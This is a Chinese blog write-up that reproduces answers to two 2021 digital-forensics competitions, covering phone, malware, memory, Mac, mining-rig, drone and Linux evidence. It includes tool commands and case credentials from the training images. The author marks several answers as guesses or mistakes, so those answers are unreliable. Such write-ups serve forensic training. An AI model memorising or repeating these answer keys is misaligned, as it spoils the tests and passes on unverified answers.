ACD\n\n\n[多选题]特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，下列哪项描述正确?(2分)\nA.软件名称是安全防护\nB.软件名称是安心回家\nC.软件签名(signAlgorithm)以SHA512withRSA加密\nD.封包名称(packageName)是org.chromium.webapk.a5b80edf82b436506_v2\n从版本可以定位 是个apk\n\n拖到雷电里看看 A\n\n\n\n[多选题]特普于电话中安装了一个可疑软件(版本为2020033001)，跟据该可疑软件的安装档，可疑软件中涉及以下安全许可?(2分)\nA.android.permission.READ_SMS读取短信内容\nB.android.permission.SEND_SMS发送短信\nC.android.permission.READ_CONTACTS读取联系人\nD.android.permission.BLUETOOTH使用蓝牙\nE.android.permission.CLEAR_APP_CACHE清除应用缓存\nACB\n\n\n[填空题]特普可能在电话中被可疑软件窃取了的验证码是什么?(请以英文全大写及阿拉伯数字回答)(2分)[填空题]\n去短信里找一下 113476\n\n谨慎一点可以分析下源码看看apk的功能实现\n\n\n\n[填空题]    特普的计算机可能中了病毒，病毒的加壳(Packing)方法是甚么?(请以英文全大写作答)(2分)[填空题]\n超到逆向了。。\n先找到病毒是哪个\n在Downloads目录下\n\nUPX\n\n\n特普的计算机可能中了病毒，病毒的编译工具是甚么?(2分)\nA.GCC\nB.Borland\nC.TCC\nD.MicrosoftVisualC/C++\n切换扫描器即可出，或者脱壳后再看 D\n\n\n[填空题]特普的计算机可能中了病毒，病毒的编译者使用可能使用的账户名称是甚么?(请以英文全大写作答)(3分)[填空题]\n这个就得拖一下壳了\nupx.exe -d xxx\n\n然后直接用strings搜关键字即可\nstrings malware.exe | grep &quot;C:\\&quot;\n\n这里可以看到Release发行的关键词，所以应该是gpgf\n\n[单选题]    特普的计算机可能中了病毒，病毒的自我复制位置是甚么?(2分)\nA.C:\\Temp\\temp.txt\nB.C:\\Users\\\\Desktop\\malware.exe\nC.C:\\Users\\public\\malware.exe\nD.C:\\a.txt\n依照上题可知，B（猜的）\n\n[单选题]    特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么?(3分)\nA.HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nB.HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nC.HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\ProfileList\nD.HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\Background\n这个应该是修改的注册表信息\n这三个可能有关\n    \n\n对应的是D\n\n[多选题]    特普的计算机可能中了病毒，病毒留下了ASCIIART(ASCII艺术,文字图)，以下哪个不是病毒留下?(3分)\nA.HI\nB.HELLO\nC.HOWAREYOU\nD.GOODBYE\nACD\n\n\n[单选题]    特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么?(2分)\nA.C:\\Users\\\\Documents\\target.txt\nB.C:\\Users\\\\Desktop\\target.txt\nC.C:\\c.txt\nD.C:\\temp.txt\n不会，瞎蒙的 A\n\n\n[单选题]    特普的计算机可能中了病毒，病毒扰乱文件方法是甚么?(3分)\nA.+3\nB.XOR5\nC.+4\nD.–4\n跳不是自己擅长的了\n\n[填空题]    特普的计算机中，哪一个是FTKImager.exe的程式编号(PID)?(请阿拉伯数字回答)(1分)[填空题]\n到内存取证部分了\n先查硬件架构\nvolatility.exe -f &quot;A:\\Group (including individual)\\Meiya Cup 2021 (all)\\image\\DaK Pou\\Dak Pou Windows_memdump\\Vtm-computer-memdump.mem&quot; imageinfo\n\n查进程号\nvolatility.exe -f &quot;A:\\Group (including individual)\\Meiya Cup 2021 (all)\\image\\DaK Pou\\Dak Pou Windows_memdump\\Vtm-computer-memdump.mem&quot; --profile=Win10x86 pslist | findstr FTK\n\n\n\n6136\n\n[多选题]    特普的计算机中，cmd.exe(PID:4496)它的执行日期及时间是?(1分)\nA.2021-10-17\nB.2021-10-18\nC.2021-10-19\nD.10:42:51\nE.10:43:09\nF.10:43:25\n直接查进程号即可 CE\n\n\n[填空题]特普的计算机曾经以FTP对外.“)连接，连接的IP是?(请以阿拉伯数字回答，不用输入”.”)(2分)[填空题]\n查看网络连接情况\nvolatility.exe -f &quot;A:\\Group (including individual)\\Meiya Cup 2021 (all)\\image\\DaK Pou\\Dak Pou Windows_memdump\\Vtm-computer-memdump.mem&quot; --profile=Win10x86 netscan\n\n\n\n无法准确定位\n\n[多选题]特普的计算机中，以下哪一个指令于上述连接中有使用过?(3分)\nA.get\nB.put\nC.delete\nD.bye\nE.quit\n\n[多选题]在Linux的”Volatility”中，哪一个指令可以知道此程式支持哪一个Windows版本?(2分)\nA.vol.py—profile\nB.vol.py—systeminfo\nC.vol.py—info\nD.vol.py—verinfo\n这啥问题hhh https://blog.csdn.net/Fly_hps/article/details/79961707\n–info 可以打印出所有已经注册的对象(插件)\nimageinfo 我们可以使用插件来猜测dump文件的profile值\nAC\n\n[填空题]常威手机中的Telegram有可能是在2021年9月24日_时44分58秒(UTC+8)首次下载的。(请以阿拉伯数字输入答案)(2分)[填空题]\n12\n\n\n[填空题]常威手机曾经连接的无人机名称是什么?(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\nSSPARK\n\n\n[填空题]常威手机中，档案“dji1633936161416.mp4”的解像度是____(例如是1920x1280，请输入19201280)。(1分)[填空题]\n指的就是分辨率吧，全局搜索\n\n\n\n导出查看 1280720\n\n\n[填空题]常威手机中，发现于网络上下载的软件“安心出行”安装档的哈希值(MD5)是?(请以英文全大写及阿拉伯数字回答)(2分)[填空题]\n安心出行在安装的程序中有两个，结合前面的题我们知道就是那个base.apk\n\n导出，直接雷电app就有md5 81c342665d9a8d4d02b0fbb7033167b5\n\n\n[多选题]常威手机中执行软件“安心出行”(版本2.1.3)中涉及以下安全许可?(2分)\nA.android.permission.ACCESS_WIFI_STATE获取WiFi状态\nB.android.permission.BATTERY_STATS电量统计\nC.android.permission.VIBRATE使用振动\nD.android.permission.CONTROL_LOCATION_UPDATES控制定位更新\nE.ndroid.permission.CAMERA拍照权限\nEC\n\n\n[多选题]常威手机中软件“安心出行”(版本2.1.3)的安装档(.apk)中，哪个不是它的签名算法?(3分)\nA.MD5withRSA\nB.SHA256withRSA\nC.SHA256withDSA\nD.MD5withDSA\nACD\n\n\n[多选题]于常威的手机中执行软件“安心出行”(版本1)可能会连接至哪一个网站?(2分)\nA.https://back-home-****.pages.dev\nB.org.chromium.**.a5b80edf82b436506\nC.org.chromium.**.a5b80edf82b436506_v2\nD.https://back-home-****.pages.dev/manifest.json\n这里做错了，可以看到这里指的是版本1的安心出行\n\n\nA\n\n[单选题]    在常威苹果手提计算机,用户开机密码是什么?(提示：常威USB设备中可能有相关数据)(3分)\nA.C*sthegoa\nB.Draw*fgdf\nC.Cokkfiddd\nD.Appiswon\n已经说在USB设备中有相关数据了，那就先看USB，直接挂上去之后啥都没有，xways提示存在假分区。试一下数据恢复，然后关键词搜一下。取证大师没有X-WAYS恢复的效果好\n\n\n[填空题]    在常威U盘内有多少磁盘分隔区?(请以阿拉伯数字回答)(2分)[填空题]\n3\n\n\n\n\n[填空题]    在常威U盘内有多少份excel文件?(请以阿拉伯数字回答)(1分)[填空题]\n3\n\n\n\n\n[填空题]    在常威U盘内,内含有多少个客户数据?(请以阿拉伯数字回答)(1分)[填空题]\n存在客户资料的excel文件\n\n有50个客户资料\n\n\n\n\n[多选题]以下哪个客户数据储存在常威U盘内？(3分)\nA.jmuat1@reference.com\nB.cgeraudg@forbes.com\nC.cwarmishamo@admin.ch\nD.abddfdf@google.com\nE. mailto:E.alex1234@apple.com\n关键词搜索 ABC\n\n[单选题]    常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统?(3分)\nA.MacOS10.11.6andMacOS11.6\nB.MacOS10.11.5andMacOS11.5\nC.MacOS10.11.4andMacOS11.6\nD.以上皆非\n首先给的是个aff4镜像文件，我们需要先进行转换成E01文件，利用x-ways制作E01\n\n\n\n然后取证大师进行挂载\n然后进行FileVault2解密，重新进行自动取证即可\n\n​    \n上一个版本可以在Data:/root/private/var/db/PreviousSystemVersion.plist中看到\n或者直接全局搜索关键词version\n\nA\n\n[多选题]    常威MAC计算机的系统事件纪录内哪个卷标(Flag)是关于储存档案于计算机?(3分)\nA.Created\nB.InodeMetaMod\nC.FinderInfoChanged\nD.IsDirectory\nE.OwnerChanged\nhttps://zhuanlan.zhihu.com/p/29816004\nABCE\n\n[多选题]    常威MAC计算机曾连接哪一个无线网络SSID?(2分)\nA.waiwifi\nB.wanchainew1\nC.central2\nD.Hongkong1\n通过密钥串定位\n\n\n\n或者在Data:/root/Library/Preferences/com.apple.wifi.known-network.plist中（不过还得解码）\n\n\n[单选题]    常威MAC计算机的使用者甚么时候将”隔空投送”(airdrop)转换至任何人模式?(2分)\nA.2021-10-2116:52:48(UTC+8)\nB.2021-10-2118:52:48(UTC+8)\nC.2021-10-2106:52:48(UTC+8)\nD.2021-10-2108:52:48(UTC+8)\n不会，应该是分析日志\n\n[填空题]常威MAC计算机的APFS储存容器的文件签名是____，偏移值为__(例如NTFS及64，请输入NTFS64)。(2分)[填空题]\n什么是APFS，有点像LVM？\n\n\n\n\nNXSB 偏移量为32（十进制）\n\n[单选题]    常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标?(1分)\nA.4\nB.5\nC.6\nD.7\n应该是5个，不能算上Chris\n\n\n[填空题]    常威MAC计算机的使用者上一次关闭浏览器时，正在浏览多少个网页?(请以阿拉伯数字回答)(3分)[填空题]\n10\n\n\n[多选题]    常威MAC计算机中以下哪个档案并不是iPhone所拍摄的图片?(2分)\nA.IMG_0002\nB.IMG_0003\nC.IMG_0004\nD.IMG_0005\nE.IMG_0006\nAD不存在\n\n\n[多选题]    在常威的矿机没有进行哪种加密货币掘矿?(2分)\nA.Bitcoin\nB.Ethereum\nC.RVN\nD.Dodge\nE.ENJ\n常用挖矿软件： phoenixminer和nbminer\n能在矿机中搜到phoenixminer\n找一下log 在/var/log目录下，猜的没看懂日志，ACDE\n\n\n[填空题]    在常威矿机有几张显示适配器进行掘矿?(请以阿拉伯数字回答)(1分)[填空题]\n找配置文件 \\hive\\miners\\phoenixminer\\h-manifest.conf\n里面提到了日志输出的位置\n\n就是刚才找的日志文件，只显示了两个GPU\n\n\n[单选题]在常威矿机\\,hiveOS**操作系统是什么版本?(1分)\nA.5.4.0*\nB.6.0.1*\nC.7.0.2*\nD.10.0.2*\nE.15.1.2*\n查看/etc/hiveos-release\nA\n\n\n[多选题]在常威矿机中,哪个不是收取掘矿收益的加密货币钱包地址?(1分)\nA.0xE365625f4537151304ceba7C7D9dF0C7E829\nB.0xe68de863f4c3c3cc0191b9cefdae91b3e6fbd8\nC.0x00000000897f4136b4a59731680a88f895303\nD.0x7335c20f9533d9cc825e2a6e80821fd44e27f8\nE.0x00000089705f4136b4a59731680a88f895303\n学会准确搜索关键词，刚开始在日志里找。应该直接全局搜索wallet\n\n\n\n\n因此 BCDE都不是\n\n[单选题]在常威矿机中,用于掘矿登入密码是什么?(2分)\nA.eg97em**wm\nB.Deg97em**wm\nC.feg97em**wm\nD.eeg97em**wm\nE.heg97em**wm\n这简直就是爆搜配置啊，在\\rig.conf中\nA\n\n\n[填空题]在常威矿机中,用于掘矿Nvidia显示适配器所使用的驱动程式使用什么版本?(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\n一般在日志开头都会输出相关环境信息 460.91.03\n\n或者在\n/usr/share/nvidia/nvidia-application-profiles-460.91.03-rc\n\n\n\n\n[多选题]在常威矿机中,用于掘矿显示适配器型号包括什么?(2分)\nA.GeForceRTX3060\nB.QuadroP2000\nC.RX6600\nD.GeForceGTX1660Ti\nE.GeForceGTX3070\n还是在日志中（很重要！！！\nAB\n\n\n[多选题]在常威矿机,哪一天没有进行掘矿?(2分)\nA.2021-10-06\nB.2021-10-09\nC.2021-10-15\nD.2021-10-17\nE.2021-10-18\n日志中只存在A选项，所以BCDE\n\n[填空题]常威的无人机中的飞航纪录_.DAT可见到于2021年10月11日1505时的GPS地点。(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\n\n\n[单选题]常威的无人机于2021年10月11日15:07:51时之间所在的地点是什么?(1分)\nA.22.269299,114.200486\nB.22.269353,114.287267\nC.22.346855,114.289552\nD.22.269293,114.201278\n\n\n[填空题]常威的无人机哪一个档案有最后降落时间的数据(请以英文全大写及阿拉伯数字回答,不用输入”.”)？(1分)[填空题]\n\n\n[多选题]常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件?(2分)\nA.Containers货柜\nB.Buildings大厦\nC.bicycle单车\nD.Mountain山\n先定位到无人机的设备位置，然后定位其对应的目录\n\n\nABD\n\n[填空题]常威的手机中显示常威的无人机DJIGO4的版本是4.3.___?(请以阿拉伯数字回答)(1分)[填空题]\n怎么找？如何操作无人机？用手机相应的软件，于是去找相关的安装程序.\n或者下一题也有提示\n4.3.37\n\n\n.[多选题]常威的手机中所安装的DJIGO4软件中，以下哪个database没有显示临时禁飞区?(2分)\nA.Filesflysafe_app.db\nB.Special_warning.db\nC.Flysafe_app_dynamic_areas.db\nD.Flysafe_polygon_1860.db\n只要C中有显示 所以ABD\n\n\n[填空题]常威的手机中在__.db可知道DJIGO4的登入电子邮件(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\n\n这里还有一个localappstate.db\n\n\n[填空题]常威的手机中在__.db包含了名为server_timestamp的资料(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\n这个有印象!  flysafe_app_dynamic_areas\n\n\n[单选题]常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址(2分)\nA.Users\\ChrisPaul\\Desktop\\安全防护Malware\\Kali-Linux-2020.2a-amd64_2.vmwarevm\nB.\\Users\\ChrisPaul\\Desktop\\安全防护MalwareDemo\\Kali-Linux-2020.2a-amd64_2.vmwarevm\nC.\\Users\\ChrisPaul\\Documents\\安全防护Malware\\Kali-Linux-2020.2a-amd64_2.vmwarevm\nD.\\Users\\ChrisPaul\\Documents\\VirtualMachines\n有两个kali，都解析一下看看，或者先看看后面的题\nA\n\n\n[单选题]常威在收集数据后储存数据于Windows计算机一个名为”text2.txt”的档案中，随后他将档案移往”\\home\\kali\\Desktop\\project\\”中,下述哪个档案可以证明这一点?\ni)    \\root.bash_history\nii)    \\home\\kali.bash_history(3分)\nA.只有i\nB.只有ii\nC.两个也可以\nD.两个也不可以\n然后利用取证大师的虚拟磁盘解析\n\n\n\n\n证实了85题路径下确实存在test2.txt，ii中不存在移动该条指令的命令记录\n\ni不知道为啥没有\n\n[单选题]常威Windows计算机中哪一个程式/档案有可能用作收取受害人电话上的数据?(3分)\nA.\\home\\kali\\Desktop\\server_express_ok.js\nB.\\home\\kali\\Desktop\\baddish\\package.json\nC.\\home\\kali\\Desktop\\baddish\\server.js\nD.\\home\\kali\\Desktop\\server.js\n从上条命令可以定位server.js，所以定位该文件。通过历史记录定位即可\nC\n\n\n\n[多选题]常威Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入Kali系统?(2分)\nA.2021-09-27\nB.2021-09-29\nC.2021-09-29\nD.11:42:47\nE.16:04:24\nF.16:30:04\n/var/log/wtmp文件存储着登录历史，导出查看\n\n单独执行 last 指令，它会读取位于 /var/log/目录下，名称为 wtmp 的文件，并把该文件记录登录的用户名，全部显示出来。\n\n-f 参数可以指定文件\n\nAF\n\n[多选题]常威Windows计算机中以下哪一个檔案的哈希值(MD5)能证明常威曾开启存有客户数据的档案?(2分)\nA.0ED1DB00F8598AD3C6B331BF0C477AD4\nB.1E1BDB083F66251A63B79DEA3801E6E9\nC.575326396E31040FE2E13BE42C55C3E2\nD.3128604B4A9EC1D37418942555F6B08A\nE.FB5EF33EDEA8ECB5BF07C5DF5332D29F\n客户数据的档案应该指的就是project同目录下的客户资料的xlsx\n\n一般快捷方式为.ink的形式，我们直接全局搜索客户资料 C\n\n\n[单选题]常威Windows计算机中，哪一个档案可以找到USB装置初次连接的时间?(1分)\nA.C:\\Windows\\setupapi.log\nB.C:\\Windows\\setupapi.setup.log\nC.C:\\Windows\\INF\\setupapi.setup.log\nD.C:\\Windows\\INF\\setupapi.dev.log\n这种直接搜关键词\n\n\n[单选题]常威Windows计算机接驳了一个3D打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件(INF檔)?(提示：关键词包含CH341)(3分)\n题目提示了关键词，全局搜CH341\nsetup.dev.log 是 windows 的设备安装日志，存储在%systemroot%/INF/目录下\n或者在上述日志文件中也可以找到\n\n定位到源文件，计算哈希 C\n\nA.1348FA38956*1770D7C3E63545BC\nB.DBC4F08F835*FF95420B352B506A\nC.35E7C67A652*611EDE19C37241C5\nD.BAE3BE76CC1*31EB562ABAFE28DE\n\n[填空题]    续上题，上述安装信息文件的版本日期是什么?(请以阿拉伯数字，及以下格式回答，例:2019年3月4日，请回答20190304)(1分)[填空题]\n20190130\n\n\n[多选题]常威Windows计算机安装了一些与3D打印机有关的软件，有可能是以下哪个?(1分)\nA.UltimakerCura\nB.3DPrinterOS\nC.Simplify3D\nD.CrealitySlicer\n关键词3D\n\n\n\n\nAD\n\n[单选题]续上题，哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块(.stl)纪录?(1分)\nA.\\Users\\ChrisPaul\\AppData\\Roaming\\CrealitySlicer\\stderr.log\nB.\\Users\\ChrisPaul\\AppData\\Roaming\\CrealitySlicer\\stdout.log\nC.\\Users\\ChrisPaul\\AppData\\Roaming\\CrealitySlicer\\4.8\\CrealitySlicer.cfg\nD.\\Users\\ChrisPaul\\AppData\\Roaming\\CrealitySlicer\\4.8\\CrealitySlicer.log\n路径都给了，直接找 D\n\n\n[多选题]续上题，哪一个3d立体模块(.stl)曾用切片软件CrealitySlicer开启?(2分)\nA.clip_sideb.stl\nB.frame.stl\nC.trigger.stl\nD.hand_guard.stl\n正则匹配readLocalFile(.*)\\.stl\nclip_spring.stl frame.stl grip.stl clip_sidea.stl \nAB\n\n[填空题]哪一个是Wai_Linux1.E01鉴证映像中LinuxLVM磁盘分区的长度?(请以阿拉伯数字回答)(1分)[填空题]\n火眼绕密码失败，尝试 手动仿真。首先取证大师验一下操作系统\n是个kali-linux\n\n需要绕密码参考  https://blog.csdn.net/weixin_44953600/article/details/110402058\nfdisk -l\n\n119,495,155,712\n\n[填空题]常威LINUX计算机安装在逻辑卷管理(LogicalVolumeManager)的磁盘分区上,哪一个是卷组(Volumegroup)的通用唯一标识符(UUID)?(请以英文全大写及阿拉伯数字回答，不用输入”-“)(1分)[填空题]\nvgdisplay\n\n\n[多选题]续上题，哪一个是逻辑卷(LogicalVolume)设定的名字?(2分)\nA. swap\nB. root\nC. va\nD. home\nABD\n\n\n\n[单选题]常威LINUX计算机曾试用挖矿程式”T-Rex“，在相关脚本(script)中哪一个是工人(worker)的名称?(1分)\n定位T-Rex脚本位置，通过历史记录\n\n\n\nt-rex是个二进制文件，看看底下那个sh\n\n都有rig0的出现\n\n[填空题]LINUX系统中利用fdisk指令下，下列哪一个是”exFAT“的磁盘分区类型编号(Partitiontypeid)?(请以英文全大写及阿拉伯数字回答)(1分)[填空题]\n\n也没有exFAT呀\n\n[单选题]在Linux的环境下，以下哪一个指令用于激活扫描到的卷组(Volumegroup)(1分)\nA.vgscan\nB.vgchange\nC.vgdisplay\nD.vgactive\nB\n\n卷组创建完毕后，可以通过 vgchange 命令来激活卷组，而无法重启系统。\n\n\n[单选题]在Linux的环境下，下列哪一个指令可以删除内有档案的文件夹?(1分)\nA.rm-d\nB.rm-r\nC.rm-rd\nD.rm-rf\nD\n\n[填空题]常威LINUX计算机逻辑滚动条(LogicalVolume)路径“vg/home”使用了甚么系统建立?(请以英文全大写回答)(2分)[填空题]\n\n\n[填空题]常威LINUX计算机逻辑滚动条(LogicalVolume)路径“vg/root”的CurrentLE是什么?(请以阿拉伯数字回答)(1分)[填空题]\n5120\n\n\n[填空题]常威LINUX计算机扇区群组(Volumegroup)的TotalPE是甚么?(请以阿拉伯数字回答)(1分)[填空题]\n\n\n\n43752\n","tags":["电子数据取证"]},{"title":"21年长安杯电子数据取证复现","url":"/2022/10/12/21%E5%B9%B4%E9%95%BF%E5%AE%89%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%8D%E7%8E%B0/","content":"案情背景2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导果聊，下载了某果聊软件，导致自己的通讯录和果聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该果聊软件的安装包—zhibo.apk(检材一)，请各位回答下列问题：（题目中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021）\n检材一\n\n\n利用雷电智能分析APP即可\n\n3fece1e93be4f422c8446b77b6863eb6a39f19d8fa71ff0250aac10f8bdde73a\n\n\n\n见上图 plus.H5B8E45D3\n或者在AndroidManifest.xml\n\n\n\n\n\n\n应用唯一标识就是给apk打包的专业厂商对应的调证值，方便公安取证时溯源找到对应厂商，每个厂商对应唯一\n\nH5B8E45D3\n\n\n\n\n\nBACDE\n\n\n\n\n利用软件自带的抓包分析工具观察HTTPS数据包\n\n同时可以观察请求体中所带的数据内容\n\n初步分析有手机号码、验证码，还有一些后续才能发现\n\n\n\nPOST\n\n\n\n从包中也可以得到www.honglian7001.com\n\n\n\napk逆向分析，由框架编写，主要业务逻辑并不在JAVA，而是在js代码当中。整个源码核心相关内容在资源文件当中\n\n在index.html中的js脚本存在加密混淆，加密方式为sojson.v4\n\n找个在线网站进行反混淆，可得到整个脚本源代码\n全局搜索变量名apiserver\n\nhttp://www.honglian7001.com/api/uploads/\n同时，可以看到代码里还含有对定位权限的相关提示输出逻辑，说明了第五题也会向后台回传定位信息\n\n\n\n\n往后找短信发送业务代码\n\n可以分析出来，接口地址为http://www.honglian7001.com/api/uploads/apisms\n\n\n\n由于是运行时产生的数据库，所以需要利用到运行时的hook技术，在关键函数中hook出有效信息。这里即是数据库文件以及下一题中提到的初始密码\nnnd，弘连给的软件hook不出来，报错系统进程找不到，只能去源码里翻了\n在类io.dcloud.WebAppActivity中能找到一个方法（其实不太能分析出是否是运行时产生的，不过从名字ad来看可能是），其中新增数据库名为test.db\n\n\n\n\n从前面密码生成逻辑可以看出，字节数组先转成16进制，再截取第2-3位并求MD5\nfrom hashlib import md5import binasciib = bytearray([97, 98, 99, 100, 101, 102])result = md5(binascii.hexlify(b)[1:3])print(result.hexdigest())\n得到c74d97b01eae257e44aa9d5bade97baf\n检材二\n\n\nE6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589\n\n\n\n案发时间为2021-04-25 8:00之前，我们挂载镜像后输入last查看登录记录\n\n可以看到为192.168.110.203\n\n\n\n目前还不知道，后面可发现该服务器就是根据不同的条件来转发请求到其他服务器，也就是负责负载均衡的职能\n\n\n\n在取证分析的history命令历史记录中多次出现可疑目录\n\n\n看着像node.js编写的一套网站，在README.txt中给出了相关指示信息\n\n可以看到服务器配置端口在了80\n\n\n\nnode.js启动命令可以百度，或者历史记录里也有\n\nnode app.js\n\n\n\n这里可以定位至controller目录下，关注ADProxy.js\n\n可以看到判断的条件是源IP地址的第3位\n\n\n\n经上一题分析，可以看到会分发到_proxy50对应的对象上，也就是IP：192.168.110.111\n\n\n\n同上可知，有3台目标服务器\n\n\n\n\n考察日志审计，我们继续去看logs目录，日志文件还挺多的。初步定位在2021-4-24这一天\n\n查看一下2021-4-24-6-26.log\n\n可以看到所有流量都转发到了192.168.110.113那台服务器上，出现多次192.168.110.142/192.168.110.203/192.168.110.252，需要进一步排查具体时间\n192.168.110.252\n\n\n\n由上题可知转发到了192.168.110.113\n检材三根据前面转发服务器的IP可以将目标镜像定位到web3.E01，挂载分析\n如何判断？访问镜像的每一个网卡信息所写的静态IP来判断（未开启DHCP）\n\n配置文件位置/etc/sysconfig/network-scripts\n\n\n\n205C1120874CE0E24ABFB3BB1525ACF330E05111E4AD1D323F3DEE59265306BF\n\n\n\n这道题没法马上出，在检材4中可以找到，先放一放。因为取证软件直接帮我们绕过了开机密码（\n在检材4中的Xshell里我们可以看到连接记录中保存了用户名和连接密码honglian7001\n\n\n\n\n宝塔的一些字符在虚拟机上直接显示不出来，设置一下DHCP的网段，使得和主机相通，利用Xshell进行连接\n​    然后输入bt即可打开宝塔面板的管理界面，根据指示获得信息\n\n用户名就是 hl123\n\n\n\n首先了解一下宝塔面板的整个目录结构，可知重要的服务功能集中在/www/server/panel/tools.py中\n\n查看该文件即可定位到重置密码函数处set_panel_pwd，这里我们也可以看到重置密码固定了id的值为1，也就是只能修改默认用户的密码\n\n\n\n\n从上一题的代码可以分析到使用的哈希算法为md5\n\n\n\n再来看这段代码，密码经过md5后又和参数uid，一起传入函数public.password_salt\n\n同时在头引用里可以看到该函数所在文件的路径，分析可得路径是/www/server/panel/class/public.py\n\n提取出该文件，定位函数代码位置\n\n可以看到里面还有两层md5哈希，所以总共执行了3次md5\n\n\n\npassword_salt中同样调用了chdck_salt()，我们看下\n\n盐的值存在了数据库里，且盐值字段可定位到sqlite_master.users.salt字段\n我们在/www/server/panel/class/db.py文件中可以找到数据库文件的位置\n\n打开db文件找到对应的字段即可，v87ilhAVumZL\n\n\n\n\n我们知道宝塔面板相应站点的根目录为/www/wwwroot，查看一下\n结合前面检材一所找到的域名我们知道绝对路径应该是/www/wwwroot/www.honglian7001\n我们可以手动测试一下宝塔管理面板，由于默认密码登录失效，需要我们重新修改一下密码\n \n登录后访问管理页面，里面存在一个搭建的TP5框架网站。\n\n\n\n由于面板上并未看到有数据库的管理，所以数据库一定是在另一台服务器上。实现了一个站库分离的架构\n在网站app/database.php中我们可以找到数据库的相关配置，其中就有IP地址192.168.110.115(还能排除一个IP)\n\n\n\n\n参考前一题，可知wxrM5GtNXk5k5EPX\n\n\n\n在宝塔面板中我们直接去访问网站会报错，因为并没有成功连接上数据库服务器，导致网站并未完整运行起来。数据库的部分在检材5。我们目前还是只能做代码层面的分析，路由里没有直接写后台相关的路径，但是观察目录结构可以发现主要业务代码都是在/admin目录下，所以可以推断出后台界面的入口为/admin\n关于salt值，在app/admin/common.php中可以找到lshi4AsSUrUOwWV\n\n\n\n\n这个不得不重构网站了，因为密码内容肯定在数据库里存着，我们挂载上检材5重建数据库。\n挂载上容器后发现里面有三个raid文件，看来是要工具进行raid重组数据库\n直接用工具R-Studio一把梭\n\n直接创建镜像文件然后仿真软件加载试试。注意创建镜像的时候应选择逐字节镜像，不然会仿真失败\n验证一下IP是否没问题\n\n重构网站成功！\n\n我们已经知道了数据库的用户名和密码，直接连即可\n\n然而对照前面的代码我们知道admin密码是经过加密存储在数据库当中。我们虽然可以通过改密码的方式来绕过登录，但是这里想要直接获得密码明文信息的话只能通过日志分析的方式\n首先日志时间定位到2021-04-24，可以看到值为security\n\n\n\n看上面代码可以知道进行了3次哈希计算\n\n\n\n\n\n登录后台，一共6002条\n\n同时每台设备能获得到的信息，我们也能准确获得，从而确定了检材一中的答案\n\n\n\n\n这个还没法确定具体的时间，所以无法准确定位，只能锁定在这4台设备上\n\n由检材4聊天记录中可以定位到具体直播软件的安装时间，基本上信息泄露出去也在这个点上\n对比时间相距最小的，我们可以知道手机号为18644099137\n\n\n\n\n检材四关于BitLocker\nBitLocker 驱动器加密恢复密钥 要验证这是否为正确的恢复密钥，请将以下标识符的开头与电脑上显示的标识符值进行比较。标识符:     3BC73D1D-E5B0-4592-B9D6-42D0A306B625如果以上标识符与电脑显示的标识符匹配，则使用以下密钥解锁你的驱动器。恢复密钥:     511126-518936-161612-135234-698357-082929-144705-622578如果以上标识符与电脑显示的标识符不匹配，则该密钥不是解锁你的驱动器的正确密钥。请尝试其他恢复密钥，或参阅 https://go.microsoft.com/fwlink/?LinkID=260589 以获得其他帮助。\n我们直接强行加载镜像，火眼分析在未加密分区中可以找到恢复密钥的文件\n\n然后根据密钥重新加载镜像即可\n\n\n\n\nE9ABE6C8A51A633F809A3B9FE5CE80574AED133BC165B5E1B93109901BB94C2B\n\n\n\n参见上面，511126-518936-161612-135234-698357-082929-144705-622578\n\n\n\n火眼仿真可以直接出12306\n\n\n\n\n在Chrome浏览器中，我们找到了后台网站的相关历史记录\n\n\n\n\n应该指的是Demon用户，存在一个zip文件，计算哈希即可\n0DD2C00C8C6DBDEA123373F91A3234D2F07D958355F6CD7126E397E12E8ADBB3\n\n\n\n\n\n什么是IMEI？\n国际移动设备识别码（International Mobile Equipment Identity，IMEI），即通常所说的手机序列号、手机“串号”。IMEI用于在移动电话网络中识别每一部独立的手机等行动通讯装置，相当于移动电话的身份证，储存在移动设备中，可用于监控被窃或无效的移动设备。所有的设备都有唯一的IMEI么？IMEI用于标示一台独立的设备，双卡类的手机因为有两个SIM卡插槽，被归类为两台设备，因此如果您使用的是双SIM卡的手机，你会看到两个IMEI号，每一个SIM卡插槽一个。\n868668044204431\n\n\n\n从开头的背景描述中我们得知受害者姓金，然后快速定位几个聊天软件，可以得知是伊对\n\n\n\n\n看聊天记录就知道啦https://cowtransfer.com/s/a6b28b4818904c\n\n\n\n\n直接定位即可 